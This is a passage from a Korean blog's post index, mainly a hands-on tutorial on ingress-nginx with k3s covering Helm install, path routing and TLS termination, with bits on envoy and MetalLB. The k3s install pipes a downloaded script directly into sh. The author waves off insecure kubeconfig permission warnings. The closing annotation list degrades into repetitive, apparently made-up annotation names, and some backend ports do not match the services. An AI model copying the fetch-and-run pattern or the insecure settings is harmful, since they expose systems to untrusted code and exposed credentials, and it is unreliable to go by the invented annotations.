--component-log-level 옵션을 통해, 컴포넌트별로 로깅을 지정할 수 있습니다.\n전역 로깅 레벨을 off로 설정하고, 특정 컴포넌트만 로깅하고 싶을 때 사용할 수 있습니다.\nALL_LOGGER_IDS : GitHub envoy -c envoy-demo.yaml -l off --component-log-level upstream:debug,connection:trace ","date":"2024-10-15T10:16:38+09:00","permalink":"https://blog.minseong.xyz/post/kans-7w-envoy-helloworld/","section":"post","tags":["kans","envoy","proxy","kubernetes"],"title":"Kubernetes Service(4): envoy overview"},{"categories":null,"contents":"지난 포스팅, Kubernetes Service(2): LoadBalancer(MetalLB)에 이어 Ingress Type을 가볍게 살펴보고, Ingress-Nginx를 가볍게 붙여보겠습니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. Ingress Type 이제, 신규 기능(New feature)은 Gateway API에 추가된다고 합니다.\n우선, Kubernetes가 헷갈리는 것 중 하나가,\nIngress Type 과 LoadBalancer Type의 명확한 차이가 뭘까...?\n라는 점이라고 봅니다. 물론, 그거 외에도 k8s에는 알쏭달쏭한 것들이 아-주 많지만요.\n친절한 Docs에 따르면,\n클러스터 외부로 클러스터 내부 서비스에 대한 HTTP 및 HTTPS 라우팅을 노출하는 것이라고 합니다.\nRules에 의한 다양한 백엔드 라우팅 외에도 Load Balancing, SSL Termination 그리고 name-based virtual hosting을 지원한다고 하는데\u0026hellip; 이쯤되면 LoadBalancer Type이랑 다른게 없는 거라고 생각을 하곤 했습니다.\n그래서 Ingress를 잊어야한다는 마음으로, 차이점만 짚어보고자 했습니다.\n2. Ingress Type vs. LoadBalancer Type https://www.baeldung.com/ops/kubernetes-ingress-vs-load-balancer 위의 링크가 먼저 나와서 슥 봤는데, 그 오해는 어디까지나 CSP에서 제공하는 ALB에 Routing Rule을 넣고 SSL을 달아서 헷갈린게 아닐까 생각을 해봤습니다.\n비용 같은 당연한 이야기는 빼고 해당 링크에서는 k8s 관점에서만 보면,\n어디까지나 LoadBalancer Type은 Service의 확장 Ingress와 달리, LB는 독립적 객체(Standalone Object)가 아님 차이가 있다는 걸 알게되었습니다.\n3. 가벼운 k3s 실습 준비 아직 Ingress Type의 관짝에 못이 안 박혔기 때문에, 가벼운 실습 준비를 해봅니다.\n이 또한 스터디에서 부트스트랩으로 제공되었기에 양해부탁드립니다.\n# Install k3s-server curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC=\u0026#34; --disable=traefik\u0026#34; sh -s - server --token kanstoken --cluster-cidr \u0026#34;172.16.0.0/16\u0026#34; --service-cidr \u0026#34;10.10.200.0/24\u0026#34; --write-kubeconfig-mode 644 # Install k3s-agent curl -sfL https://get.k3s.io | K3S_URL=https://192.168.10.10:6443 K3S_TOKEN=kanstoken sh -s - kubeadm을 많이 다루신 현업 분들께서는 좀 많이 익숙한 파라미터들이 보입니다.\n다만, --disable=traefik이라는 파라미터가 k3s server 설치 스크립트에서 볼 수 있는데요,\nk3s가 Ingress Controller로 Traefik을 사용하는데, Ingress-Nginx를 사용하기 위해 Traefik을 비활성화 시키는 것입니다.\ncat /etc/rancher/k3s/k3s.yaml apiVersion: v1 clusters: - cluster: certificate-authority-data: LS0tLS1CR(중략)LS0tLS0K server: https://127.0.0.1:6443 name: default contexts: - context: cluster: default user: default name: default current-context: default kind: Config preferences: {} users: - name: default user: client-certificate-data: LS0tLS1C(중략)LS0tLS0K client-key-data: LS0tLS1(중략)LS0tLQo= k3s는 SUSE및 Rancher에서 개발되어, CNCF Sandbox Project로 등록되어있는,\nIoT \u0026amp; Edge Computing을 위한 k8s 배포도구이기에 rancher 폴더가 생겼음을 유추해볼 수 있습니다.\n4. Ingress-Nginx 컨트롤러 배포 (Helm) 제가 조작하지 않는, Helm에 데인 이후로 선호도가 급?격하게 떨어지긴 했는데, 여튼 편하니까 해봅시다.\n(a) Helm Values 파일 작성 및 Helm Repo 추가 NodePort로 해당 서비스를 노출하기로 해봅시다. cat \u0026lt;\u0026lt;EOT\u0026gt; ingress-nginx-values.yaml controller: service: type: NodePort nodePorts: http: 30080 https: 30443 nodeSelector: kubernetes.io/hostname: \u0026#34;k3s-s\u0026#34; metrics: enabled: true serviceMonitor: enabled: true EOT helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx helm repo update insecure warning이 뜨지만, 이게 학습이라 그저 넘어가도록 합시다.\nWARNING: Kubernetes configuration file is group-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml WARNING: Kubernetes configuration file is world-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml \u0026#34;ingress-nginx\u0026#34; has been added to your repositories WARNING: Kubernetes configuration file is group-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml WARNING: Kubernetes configuration file is world-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml (b) ns 생성 및 Helm Chart 배포 kubectl create ns ingress helm install ingress-nginx ingress-nginx/ingress-nginx -f ingress-nginx-values.yaml --namespace ingress --version 4.11.2 # Check kubectl get all -n ingress kubectl get svc -n ingress ingress-nginx-controller Warning은 에?러가 아니니까, 대개 잘 잡히는 것 같습니다.\nkubectl create ns ingress helm install ingress-nginx ingress-nginx/ingress-nginx -f ingress-nginx-values.yaml --namespace ingress --version 4.11.2 namespace/ingress created WARNING: Kubernetes configuration file is group-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml WARNING: Kubernetes configuration file is world-readable. This is insecure. Location: /etc/rancher/k3s/k3s.yaml NAME: ingress-nginx LAST DEPLOYED: Thu Oct 10 23:39:48 2024 NAMESPACE: ingress STATUS: deployed REVISION: 1 TEST SUITE: None NOTES: The ingress-nginx controller has been installed. Get the application URL by running these commands: export HTTP_NODE_PORT=30080 export HTTPS_NODE_PORT=30443 export NODE_IP=\u0026#34;$(kubectl get nodes --output jsonpath=\u0026#34;{.items[0].status.addresses[1].address}\u0026#34;)\u0026#34; echo \u0026#34;Visit http://${NODE_IP}:${HTTP_NODE_PORT} to access your application via HTTP.\u0026#34; echo \u0026#34;Visit https://${NODE_IP}:${HTTPS_NODE_PORT} to access your application via HTTPS.\u0026#34; An example Ingress that makes use of the controller: apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: example namespace: foo spec: ingressClassName: nginx rules: - host: www.example.com http: paths: - pathType: Prefix backend: service: name: exampleService port: number: 80 path: / # This section is only required if TLS is to be enabled for the Ingress tls: - hosts: - www.example.com secretName: example-tls If TLS is enabled for the Ingress, a Secret containing the certificate and key must also be provided: apiVersion: v1 kind: Secret metadata: name: example-tls namespace: foo data: tls.crt: \u0026lt;base64 encoded cert\u0026gt; tls.key: \u0026lt;base64 encoded key\u0026gt; type: kubernetes.io/tls kubectl get all -n ingress kubectl describe svc -n ingress ingress-nginx-controller 그렇군요.\n# kubectl get all -n ingress NAME READY STATUS RESTARTS AGE pod/ingress-nginx-controller-979fc89cf-lk7th 1/1 Running 0 92s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/ingress-nginx-controller NodePort 10.10.200.235 \u0026lt;none\u0026gt; 80:30080/TCP,443:30443/TCP 92s service/ingress-nginx-controller-admission ClusterIP 10.10.200.100 \u0026lt;none\u0026gt; 443/TCP 92s service/ingress-nginx-controller-metrics ClusterIP 10.10.200.234 \u0026lt;none\u0026gt; 10254/TCP 92s NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/ingress-nginx-controller 1/1 1 1 92s NAME DESIRED CURRENT READY AGE replicaset.apps/ingress-nginx-controller-979fc89cf 1 1 1 92s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE ingress-nginx-controller NodePort 10.10.200.235 \u0026lt;none\u0026gt; 80:30080/TCP,443:30443/TCP 92s NodePort를 사용하는 것을 알 수 있습니다.\nIP Addr이 다른 이유는 EC2 끄고 다시켰더니, 오류나서 다시 올렸습니다.\n# kubectl describe svc -n ingress ingress-nginx-controller (전략) Type: NodePort IP Family Policy: SingleStack IP Families: IPv4 IP: 10.10.200.180 IPs: 10.10.200.180 Port: http 80/TCP TargetPort: http/TCP NodePort: http 30080/TCP Endpoints: 172.16.0.3:80 Port: https 443/TCP TargetPort: https/TCP NodePort: https 30443/TCP Endpoints: 172.16.0.3:443 Session Affinity: None External Traffic Policy: Cluster Events: \u0026lt;none\u0026gt; (c) externalTrafficPolicy: Local 컨트롤러에 NodePort를 사용하고, externalTrafficPolicy: Local을 사용하면,\n클라이언트의 요청이 도착한 노드로 바로 전달되어, 노드의 로컬 IP로부터 응답을 받을 수 있다고 하는데\n일단 켜보고 환경값 체크를 합니다.\nkubectl patch svc ingress-nginx-controller -n ingress -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;externalTrafficPolicy\u0026#34;:\u0026#34;Local\u0026#34;}}\u0026#39; # service/ingress-nginx-controller patched kubectl get cm -n ingress ingress-nginx-controller kubectl exec deploy/ingress-nginx-controller -n ingress -it -- cat /etc/nginx/nginx.conf # (생략) 평소에 보던 Nginx.conf 가 이했나....? 버전 정보도 확인해보겠습니다.\nPOD_NS=ingress POD_NAME=$(kubectl get pods -n $POD_NS -l app.kubernetes.io/name=ingress-nginx --field-selector=status.phase=Running -o name) kubectl exec $POD_NAME -n $POD_NS -- /nginx-ingress-controller --version 적당히 출력됩니다.\n------------------------------------------------------------------------------- NGINX Ingress controller Release: v1.11.2 Build: 46e76e5916813cfca2a9b0bfdc34b69a0000f6b9 Repository: https://github.com/kubernetes/ingress-nginx nginx version: nginx/1.25.5 ------------------------------------------------------------------------------- 5. 테스트 서비스 배포 (ClusterIP, NodePort) Ingress 컨트롤러가 ClusterIP, NodePosrt 무관하게 외부에 노출시킬 수 있는지에 대해\n테스트 실습을 해볼 겁니다.\nService Type Port Test App ClusterIP 9001 nginx NodePort 9002 kubetnetes-bootcamp 정의 없음(Default: ClusterIP) 9003 echoserver (a) ClusterIP Service cat \u0026lt;\u0026lt;EOT\u0026gt; clusterip-nginx.yaml apiVersion: apps/v1 kind: Deployment metadata: name: deploy1-websrv spec: replicas: 1 selector: matchLabels: app: websrv template: metadata: labels: app: websrv spec: containers: - name: pod-web image: nginx --- apiVersion: v1 kind: Service metadata: name: svc1-web spec: ports: - name: web-port port: 9001 targetPort: 80 selector: app: websrv type: ClusterIP EOT (b) NodePort Service cat \u0026lt;\u0026lt;EOT\u0026gt; nodeport-kbc.yaml apiVersion: apps/v1 kind: Deployment metadata: name: deploy2-guestsrv spec: replicas: 2 selector: matchLabels: app: guestsrv template: metadata: labels: app: guestsrv spec: containers: - name: pod-guest image: gcr.io/google-samples/kubernetes-bootcamp:v1 ports: - containerPort: 8080 --- apiVersion: v1 kind: Service metadata: name: svc2-guest spec: ports: - name: guest-port port: 9002 targetPort: 8080 selector: app: guestsrv type: NodePort EOT (c) Default Service cat \u0026lt;\u0026lt;EOT\u0026gt; default-echoserver.yaml apiVersion: apps/v1 kind: Deployment metadata: name: deploy3-adminsrv spec: replicas: 3 selector: matchLabels: app: adminsrv template: metadata: labels: app: adminsrv spec: containers: - name: pod-admin image: k8s.gcr.io/echoserver:1.5 ports: - containerPort: 8080 --- apiVersion: v1 kind: Service metadata: name: svc3-admin spec: ports: - name: admin-port port: 9003 targetPort: 8080 selector: app: adminsrv EOT (d) 배포 및 확인 kubectl apply -f clusterip-nginx.yaml kubectl apply -f nodeport-kbc.yaml kubectl apply -f default-echoserver.yaml (e) taint 설정 및 재배포 확인 현재는 Control Plane(Master) Node에 taint 설정이 없어서, pod가 배포된 것을 볼 수 있습니다.\n# kubectl get ingress,svc,ep,pod -owide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/kubernetes ClusterIP 10.10.200.1 \u0026lt;none\u0026gt; 443/TCP 27h \u0026lt;none\u0026gt; service/svc1-web ClusterIP 10.10.200.69 \u0026lt;none\u0026gt; 9001/TCP 3m22s app=websrv service/svc2-guest NodePort 10.10.200.117 \u0026lt;none\u0026gt; 9002:30133/TCP 3m22s app=guestsrv service/svc3-admin ClusterIP 10.10.200.249 \u0026lt;none\u0026gt; 9003/TCP 108s app=adminsrv NAME ENDPOINTS AGE endpoints/kubernetes 192.168.10.10:6443 27h endpoints/svc1-web 172.16.1.3:80 3m22s endpoints/svc2-guest 172.16.0.5:8080,172.16.3.3:8080 3m22s endpoints/svc3-admin 172.16.0.6:8080,172.16.2.3:8080,172.16.3.4:8080 108s NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/deploy1-websrv-5c6b88bd77-w5nph 1/1 Running 0 3m22s 172.16.1.3 k3s-w1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy2-guestsrv-649875f78b-4tj8d 1/1 Running 0 3m22s 172.16.0.5 k3s-s \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy2-guestsrv-649875f78b-js862 1/1 Running 0 3m22s 172.16.3.3 k3s-w2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy3-adminsrv-7c8f8b8c87-4q8h6 1/1 Running 0 108s 172.16.3.4 k3s-w2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy3-adminsrv-7c8f8b8c87-6xwk5 1/1 Running 0 108s 172.16.0.6 k3s-s \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy3-adminsrv-7c8f8b8c87-hvq7n 1/1 Running 0 108s 172.16.2.3 k3s-w3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 우린 이걸 용?납할 수 없기 때문에, taint를 걸고 어떻게 작동하나 확인해볼 것입니다.\nkubectl taint nodes k3s-s role=controlplane:NoSchedule # node/k3s-s tainted 대신 빠른 적용 확인을 위해, 각 Deployment 정의에 terminationGracePeriodSeconds: 0를 추가합니다.\napiVersion: apps/v1 kind: Deployment # (중략) spec: containers: - name: pod-web image: nginx terminationGracePeriodSeconds: 0 --- # (후략) 이후에 다시 적용(apply)하고 확인해보겠습니다.\nkubectl apply -f clusterip-nginx.yaml kubectl apply -f nodeport-kbc.yaml kubectl apply -f default-echoserver.yaml Control Plane에 대한 Pod만 재배포 될 줄 알았는데, 생각해보니 terminationGracePeriodSeconds: 0 spec이 추가되었기 때문에 각 deployment 전체가 재배포되었습니다.\nkubectl get ingress,svc,ep,pod -owide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/kubernetes ClusterIP 10.10.200.1 \u0026lt;none\u0026gt; 443/TCP 27h \u0026lt;none\u0026gt; service/svc1-web ClusterIP 10.10.200.69 \u0026lt;none\u0026gt; 9001/TCP 16m app=websrv service/svc2-guest NodePort 10.10.200.117 \u0026lt;none\u0026gt; 9002:30133/TCP 16m app=guestsrv service/svc3-admin ClusterIP 10.10.200.249 \u0026lt;none\u0026gt; 9003/TCP 14m app=adminsrv NAME ENDPOINTS AGE endpoints/kubernetes 192.168.10.10:6443 27h endpoints/svc1-web 172.16.1.4:80 16m endpoints/svc2-guest 172.16.2.4:8080,172.16.3.6:8080 16m endpoints/svc3-admin 172.16.1.5:8080,172.16.2.5:8080,172.16.3.5:8080 14m NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/deploy1-websrv-69cb66b964-nppv5 1/1 Running 0 96s 172.16.1.4 k3s-w1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy2-guestsrv-cbb5d6665-jhbpm 1/1 Running 0 86s 172.16.3.6 k3s-w2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy2-guestsrv-cbb5d6665-sb67h 1/1 Running 0 95s 172.16.2.4 k3s-w3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy3-adminsrv-77b7c78b98-79pgl 1/1 Running 0 94s 172.16.3.5 k3s-w2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy3-adminsrv-77b7c78b98-vfbv5 1/1 Running 0 93s 172.16.1.5 k3s-w1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; pod/deploy3-adminsrv-77b7c78b98-zvkgv 1/1 Running 0 95s 172.16.2.5 k3s-w3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 여기까지는 예상된대로, 서비스 포트 9001, 9002, 9003이 각각 배포되었음을 확인할 수 있습니다.\n이 상태로는 http://\u0026lt;EC2_PUBLIC_IP\u0026gt;:30133/ 만 외부에서 접속할 수 있습니다.\nIngress가 ClusterIP, NodePort 무관하게 외부에 서비스를 배포하게 만들어볼 것입니다.\n6. Ingress 리소스 생성 ALB(L7) Rule을 정하는 것과 유사합니다.\ncat \u0026lt;\u0026lt;EOT\u0026gt; ingress-nginx-rule-1.yaml apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: ingress-rule-1 namespace: default annotations: #nginx.ingress.kubernetes.io/rewrite-target: / spec: ingressClassName: nginx rules: # - host: nginx.minseong.xyz # http: # paths: - http: paths: - path: / pathType: Prefix backend: service: name: svc1-web port: number: 80 - path: /kbc pathType: Prefix backend: service: name: svc2-guest port: number: 8080 - path: /guest pathType: Prefix backend: service: name: svc3-admin port: number: 8080 EOT path 기반으로 서비스를 라우팅하려는 것을 확인할 수 있습니다.\n서비스의 포트가 아닌 이름으로 지정할 수 있습니다.\n# kubectl get ingress -owide NAME CLASS HOSTS ADDRESS PORTS AGE ingress.networking.k8s.io/ingress-rule-1 nginx * 10.10.200.180 80 43s Rule이 적용되었음을 알 수 있습니다.\n# kubectl describe ingress ingress-rule-1 Name: ingress-rule-1 Labels: \u0026lt;none\u0026gt; Namespace: default Address: 10.10.200.180 Ingress Class: nginx Default backend: \u0026lt;default\u0026gt; Rules: Host Path Backends ---- ---- -------- * / svc1-web:80 () /kbc svc2-guest:8080 () /guest svc3-admin:8080 () Annotations: \u0026lt;none\u0026gt; Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Sync 22m (x2 over 23m) nginx-ingress-controller Scheduled for sync 위의 룰이 컨트롤러에 어떻게 적용되어있는지 보도록 합시다.\n# kubectl exec deploy/ingress-nginx-controller -n ingress -it -- cat /etc/nginx/nginx.conf | grep \u0026#39;location /\u0026#39; -A5 location /guest/ { set $namespace \u0026#34;default\u0026#34;; set $ingress_name \u0026#34;ingress-rule-1\u0026#34;; set $service_name \u0026#34;svc3-admin\u0026#34;; set $service_port \u0026#34;8080\u0026#34;; -- location /kbc/ { set $namespace \u0026#34;default\u0026#34;; set $ingress_name \u0026#34;ingress-rule-1\u0026#34;; set $service_name \u0026#34;svc2-guest\u0026#34;; set $service_port \u0026#34;8080\u0026#34;; -- location / { set $namespace \u0026#34;default\u0026#34;; set $ingress_name \u0026#34;ingress-rule-1\u0026#34;; set $service_name \u0026#34;svc1-web\u0026#34;; set $service_port \u0026#34;80\u0026#34;; -- (후략) (a) 접속 확인 아래의 출력된 링크를 로컬의 웹브라우저로 접속해보면 아주 잘 접속됩니다.\necho -e \u0026#34;Ingress1 sv1-web URL = http://$(curl -s ipinfo.io/ip):30080\u0026#34; # Ingress1 sv1-web URL = http://43.202.54.183:30080 echo -e \u0026#34;Ingress1 sv2-guest URL = http://$(curl -s ipinfo.io/ip):30080/guest\u0026#34; # Ingress1 sv2-guest URL = http://43.202.54.183:30080/guest echo -e \u0026#34;Ingress1 sv3-admin URL = http://$(curl -s ipinfo.io/ip):30080/kbc\u0026#34; # Ingress1 sv3-admin URL = http://43.202.54.183:30080/kbc (b) 더 알아보기 로컬 환경에서 좀 더 볼까요?\nEC2_MASTER_PUB_IP=\u0026lt;EC2 Control Plane의 Public IP\u0026gt; # EC2_MASTER_PUB_IP=43.202.54.183 for i in {1..100}; do curl -s $EC2_MASTER_PUB_IP:30080/guest ; done | sort | uniq -c | sort -nr Nginx 기준, 뭔가 좀 익숙한 값들이 보입니다.\n특히 Ingress를 통해, 어디(로컬)에서 접근을 했는지 알 수 있습니다.\n800 100 x-scheme=http 100 x-real-ip=\u0026lt;로컬 환경의 공인 IP\u0026gt; 100 x-forwarded-scheme=http 100 x-forwarded-proto=http 100 x-forwarded-port=80 100 x-forwarded-host=43.202.54.183:30080 100 x-forwarded-for=\u0026lt;로컬 환경의 공인 IP\u0026gt; 100 user-agent=curl/8.5.0 100 server_version=nginx: 1.13.0 - lua: 10008 100 Server values: 100 request_version=1.1 100 request_uri=http://43.202.54.183:8080/guest 100 Request Information: 100 Request Headers: 100 Request Body: 100 real path=/guest 100 query= 100 Pod Information: 100 -no pod information available- 100 -no body in request- 100 method=GET 100 host=43.202.54.183:30080 100 client_address=172.16.0.3 100 accept=*/* 34 Hostname: deploy3-adminsrv-77b7c78b98-zvkgv 33 Hostname: deploy3-adminsrv-77b7c78b98-vfbv5 33 Hostname: deploy3-adminsrv-77b7c78b98-79pgl 1 x-request-id=fda5b56e29f9c0109124762aab619f3d 1 x-request-id=fc5161bd78bb6a82f578c854e79a6dd7 1 x-request-id=fb98bfdbf78a87071c5ad119c8f01c7c 1 x-request-id=f6e07d531bb0a54a029abb4c0657b55b 1 x-request-id=f4e66a64fac7e0f21df5577058c623c8 1 x-request-id=f050b3f7f7e22b55b1b80c7a794cb659 (후략) 필요한 정보만 보고 싶다면, 이렇게 할 수도 있겠네요.\ncurl -s $EC2_MASTER_PUB_IP:30080/guest | egrep \u0026#39;(client_address|x-forwarded-for)\u0026#39; # client_address=172.16.0.3 # x-forwarded-for=\u0026lt;로컬 환경의 공인 IP\u0026gt; 그럼 이 client_address는 어디서 튀어나온 걸까요?\n앞에서 4.-(a) 에서 helm으로 첫 배포 후 확인했을 때의 엔드포인트 입니다.\nkubectl describe svc -n ingress ingress-nginx-controller | grep Endpoints # Endpoints: 172.16.0.3:80 # Endpoints: 172.16.0.3:443 kubectl get -n ingress pods -owide # NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES # ingress-nginx-controller-979fc89cf-f24fk 1/1 Running 0 29h 172.16.0.3 k3s-s \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 7. TLS Termination (처리) 맛보기 올해 초에 자동 갱신되어버린 테스트 도메인을 사용해봅시다.\n음 호스트 정보 제어를 통해 해봅시다.\n가상의 호스트 kkumtree.xyz가 있다고 해봅시다.\n(a) 배포 준비 TLS 통신을 위한 인증서를 secret으로 저장하여 쓰는 것입니다.\ncat \u0026lt;\u0026lt;EOT\u0026gt; tls-echoserver.yaml apiVersion: v1 kind: Pod metadata: name: pod-https labels: app: https spec: containers: - name: container image: k8s.gcr.io/echoserver:1.6 terminationGracePeriodSeconds: 0 --- apiVersion: v1 kind: Service metadata: name: svc-https spec: selector: app: https ports: - port: 8080 EOT cat \u0026lt;\u0026lt;EOT\u0026gt; ssl-termination-ingress.yaml apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: https spec: ingressClassName: nginx tls: - hosts: - kkumtree.abc secretName: secret-https rules: - host: kkumtree.abc http: paths: - path: / pathType: Prefix backend: service: name: svc-https port: number: 8080 EOT (b) 배포 및 인증서 생성 적용은 다음과 같이 합니다.\n테스트 POD 배포 가상의 도메인 지정 Ingress 리소스 생성 인증서 생성 및 Secret 생성 테스트 TEST_DNS=kkumtree.abc kubectl apply -f tls-echoserver.yaml kubectl apply -f ssl-termination-ingress.yaml openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj \u0026#34;/CN=$TEST_DNS/O=$TEST_DNS\u0026#34; kubectl create secret tls secret-https --key tls.key --cert tls.crt kubectl get secrets secret-https -o yaml 참 쉽죠? 스터디 없었으면 99.99% 헤멤\n# (전략) secret/secret-https created apiVersion: v1 data: tls.crt: LS0tLS1C(중략)LS0tLQo= tls.key: LS0tLS1C(중략)LS0tLS0K kind: Secret metadata: creationTimestamp: \u0026#34;2024-10-13T08:33:44Z\u0026#34; name: secret-https namespace: default resourceVersion: \u0026#34;81976\u0026#34; uid: 3cc3014e-(중략)-c8422a2197e3 type: kubernetes.io/tls (c) 확인 가짜 도메인은 직접 쓸 수 없기에 /etc/hosts 등록이나\n로컬에서 아래와 같이 설정하여 확인합니다.\n옵션의 대소문자 유의\nEC2_MASTER_PUB_IP=\u0026lt;6.(b)에서 활용했음\u0026gt; # EC2_MASTER_PUB_IP=43.202.54.183 TEST_DNS=\u0026lt;테스트용으로 지정한 가짜 도메인\u0026gt; # TEST_DNS=kkumtree.abc curl -Lk -H \u0026#34;host: $TEST_DNS\u0026#34; https://$EC2_MASTER_PUB_IP:30443 다음과 같이 나올 겁니다.\n# curl -Lk -H \u0026#34;host: $TEST_DNS\u0026#34; https://$EC2_MASTER_PUB_IP:30443 Hostname: pod-https Pod Information: -no pod information available- Server values: server_version=nginx: 1.13.1 - lua: 10008 Request Information: client_address=172.16.0.3 method=GET real path=/ query= request_version=1.1 request_uri=http://kkumtree.abc:8080/ Request Headers: accept=*/* host=kkumtree.abc user-agent=curl/8.5.0 x-forwarded-for=\u0026lt;로컬 환경의 공인 IP\u0026gt; x-forwarded-host=kkumtree.abc x-forwarded-port=443 x-forwarded-proto=https x-forwarded-scheme=https x-real-ip=\u0026lt;로컬 환경의 공인 IP\u0026gt; x-request-id=0b3e51d89dfede6b31e72e8a1d09a25a x-scheme=https Request Body: -no body in request- 8. 뱀다리 Ngnix Ingress Annotation 예제들 가끔은 눈을 감을 줄 알아야하나\u0026hellip; 싶은\u0026hellip;\n링크: Ingress-Nginx Controller\n#nginx.ingress.kubernetes.io/rewrite-target: / #nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;false\u0026#34; #nginx.ingress.kubernetes.io/upstream-hash-by: $remote_addr #nginx.ingress.kubernetes.io/affinity: \u0026#34;cookie\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-name: \u0026#34;route\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-hash: \u0026#34;sha1\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-expires: \u0026#34;172800\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-max-age: \u0026#34;172800\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-path: \u0026#34;/; Secure; HttpOnly\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-secure: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-samesite: \u0026#34;Strict\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-domain: \u0026#34;minseong.xyz\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-httponly: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-persistent: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-failure: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-edit: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-failure: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-edit: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-edit-failure: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-edit-failure-renew: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-edit-failure-renew-edit: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-edit-failure-renew-edit-failure: \u0026#34;true\u0026#34; #nginx.ingress.kubernetes.io/session-cookie-change-on-renew-edit-failure-renew-edit-failure-renew: \u0026#34;true\u0026#34; ","date":"2024-10-10T22:12:57+09:00","permalink":"https://blog.minseong.xyz/post/kans-6w-k3s-ingress/","section":"post","tags":["kans","k3s","ingress","nginx","kubernetes"],"title":"Kubernetes Service(3): Ingress(ingress-nginx) w/k3s"},{"categories":null,"contents":"지난 포스팅, Kubernetes Service(1): ClusterIP/NodePort에 이어 LoadBalancer Type을 가볍게 살펴보고, MetalLB를 가볍게 붙여보겠습니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. LoadBalancer Type Service(1)에서 언급된 부분은 거두절미하고, 추가로 적을 수 있는 부분이 있다면, 아래 한 줄이 있습니다.\nYou can define a LoadBalancer Service by disabling the load balancer NodePort allocation.\n글자 그대로 LB의 NodePort 할당을 비활성하여, LoadBalancer Service를 정의할 수 있습니다.\nDisabling load balancer NodePort allocation 문서를 살펴보니,\nv1.24부터 Stable 상태로 보입니다.\n해당 문서에서 핵심만 추리자면\u0026hellip;\nspec.allocateLoadBalancerNodePorts: true (default) Traffic을 Pod로 직접 Routing하는 LB를 구현(implementation)하고자 할 때만 false로 변경하여 사용되어야 한다고 합니다. 그렇지 않으면, 즉 Node port가 할당된 기존 노드에 false가 설정되면, Node ports는 자동으로 할당 해제되지 않는다고 합니다. **not** be de-allocated automatically 모든 서비스에서 명시적으로 nodePorts 를 제거해야한다고 합니다. 그리고 어조가 꽤나 센 편입니다. 그만 알아보자\n2. MetalLB 스터디 후반부에 AWS EKS를 사용하고, 현재는 kind 환경에서 진행하는 것이므로 MetalLB를 사용하기로 했습니다.\n이미 작년에 개인 프로젝트로 kubeadm+virtualbox 조합으로 구축할 때 외부 접근을 위해 MetalLB를 써봤고,\nV-raptor SQ nano로 이것저것 만져볼때, Canonical microk8s에서도 metalLB addon을 지원하는 것을 알게된 바,\n이미 현업 분들에게는 친숙한 툴이라 생각하고 설명은 생략하겠습니다(?).\n사실 당시에 사서 고생을 해서, 포스팅을 남겨놨을 것 같았는데 코드로만 존재하네요. 빠른 손절.\n그건 그렇고 microk8s에서 metalLB addon 티커가 v1.17로 남아있어 심히 불편함을 감출 수 없군요\n일단 BGP는 클러스터링을 두 개를 해야되서 좀 그렇고, Layer2 기반으로 